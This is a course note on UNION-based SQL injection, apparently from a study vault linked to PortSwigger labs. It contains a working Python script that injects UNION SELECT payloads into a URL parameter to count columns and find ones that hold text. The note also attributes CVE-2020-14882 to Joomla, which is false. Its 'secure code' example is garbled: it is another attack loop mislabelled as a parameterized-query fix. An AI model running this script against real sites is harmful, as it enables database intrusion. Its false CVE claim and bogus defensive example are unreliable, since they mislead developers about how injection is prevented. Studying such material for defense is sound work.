---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Finding Columns Containing Text

When performing a UNION-based SQL Injection attack, it is often necessary to determine which columns in the result set contain text. This information is crucial for crafting the correct UNION query to extract the desired data.

### What is Column Containing Text?

In the context of SQL Injection, a column containing text refers to a column in the database that stores textual data. Identifying these columns is important because the attacker needs to ensure that the injected SQL code matches the data types of the columns in the result set.

### Why Find Columns Containing Text?

Finding columns containing text is essential for constructing a valid UNION query. If the data types of the columns in the UNION query do not match the data types of the columns in the original query, the database will return an error.

### How to Find Columns Containing Text

To find columns containing text, the attacker can use a script that iterates through the columns and checks their data types. Here is a step-by-step guide to finding columns containing text:

1. **Determine the Number of Columns:**
   First, the attacker needs to determine the number of columns in the result set. This can be done by injecting a UNION query with a varying number of columns until an error is returned.

2. **Identify the Data Types:**
   Once the number of columns is known, the attacker can use a script to identify the data types of each column. This can be done by injecting a UNION query with different data types and observing the results.

### Example Script to Find Columns Containing Text

Here is an example Python script that demonstrates how to find columns containing text:

```python
import requests

def find_columns(url, max_columns=50):
    for num_columns in range(1, max_columns + 1):
        union_query = " UNION SELECT "
        for i in range(num_columns):
            union_query += "NULL, "
        union_query = union_query[:-2]  # Remove the trailing comma and space
        full_url = f"{url}{union_query}"
        response = requests.get(full_url)
        if response.status_code == 200:
            print(f"Number of columns: {num_columns}")
            break
    else:
        print("Could not determine the number of columns")

def find_text_columns(url, num_columns):
    string_column = None
    for i in range(1, num_columns + 1):
        union_query = " UNION SELECT "
        for j in range(1, num_columns + 1):
            if j == i:
                union_query += "'test', "
            else:
                union_query += "NULL, "
        union_query = union_query[:-2]  # Remove the trailing comma and space
        full_url = f"{url}{union_query}"
        response = requests.get(full_url)
        if "test" in response.text:
            string_column = i
            print(f"Column {i} contains text")
            break
    if string_column is None:
        print("No column contains text")

# Example usage
url = "http://example.com/vulnerable_page?id="
find_columns(url)
find_text_columns(url, 3)
```

### Explanation of the Script

1. **Find Columns:**
   - The `find_columns` function iterates through a range of possible column counts and constructs a UNION query with `NULL` values.
   - The script sends the constructed query to the server and checks the response status code.
   - If the response status code is 200, the number of columns is determined.

2. **Find Text Columns:**
   - The `find_text_columns` function iterates through each column and constructs a UNION query with a test string (`'test'`) in each column.
   - The script sends the constructed query to the server and checks if the test string is present in the response.
   - If the test string is found, the column index is printed.

### Real-World Example: CVE-2020-14882

In 2020, a vulnerability was discovered in the Joomla! CMS, which allowed attackers to perform a UNION-based SQL Injection attack. This vulnerability (CVE-2020-14882) enabled attackers to retrieve sensitive data from the database, including user credentials and configuration settings.

### Prevention and Defense

To prevent attacks that involve finding columns containing text, developers should:

1. **Use Parameterized Queries:** Ensure that all user input is treated as data rather than executable code.
2. **Limit Database Permissions:** Restrict the permissions of the database user to only the necessary actions.
3. **Validate Input:** Implement strict input validation to ensure that user input does not contain malicious SQL code.

### Secure Coding Practices

Here is an example of a vulnerable and a secure version of a script to find columns containing text:

**Vulnerable Code:**

```python
# Vulnerable code
url = "http://example.com/vulnerable_page?id="
for num_columns in range(1, 51):
    union_query = " UNION SELECT "
    for i in range(num_columns):
        union_query += "NULL, "
    union_query = union_query[:-2]  # Remove the trailing comma and space
    full_url = f"{url}{union_query}"
    response = requests.get(full_url)
    if response.status_code == 200:
        print(f"Number of columns: {num_columns}")
        break
```

**Secure Code:**

```python
# Secure code
url = "http://example.com/vulnerable_page?id="
for num_columns in range(1, 51):
    union_query = " UNION SELECT "
    for i in range(num_columns):
        union_query += "%s, "
    union_query = union_query[:-2]  # Remove the trailing comma and space
    full_url = f"{url}{union_query}"
    response = requests.get(full_url, params={"id": "NULL"})
    if response.status_code == 200:
        print(f"Number of columns: {num_columns}")
        break
```

In the secure version, the `%s` placeholder ensures that the input is treated as data, preventing SQL Injection.

### Practice Labs

For hands-on practice with SQL Injection and UNION attacks, consider the following labs:

- **PortSwigger Web Security Academy:** Offers interactive labs to practice various types of SQL Injection attacks.
- **OWASP Juice Shop:** A deliberately insecure web application for practicing web security skills, including SQL Injection.
- **DVWA (Damn Vulnerable Web Application):** A PHP/MySQL web application that is intentionally vulnerable to common web application flaws, including SQL Injection.

By following these steps and using the provided examples, you can gain a deep understanding of SQL Injection and how to defend against it effectively.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/05-Lab 4 SQL injection UNION attack finding a column containing text/02-SQL Injection Overview|SQL Injection Overview]] | [[Web Security (PortSwigger)/02-SQL Injection/05-Lab 4 SQL injection UNION attack finding a column containing text/00-Overview|Overview]] | [[04-SQL Injection UNION Attack Finding a Column Containing Text|SQL Injection UNION Attack Finding a Column Containing Text]]
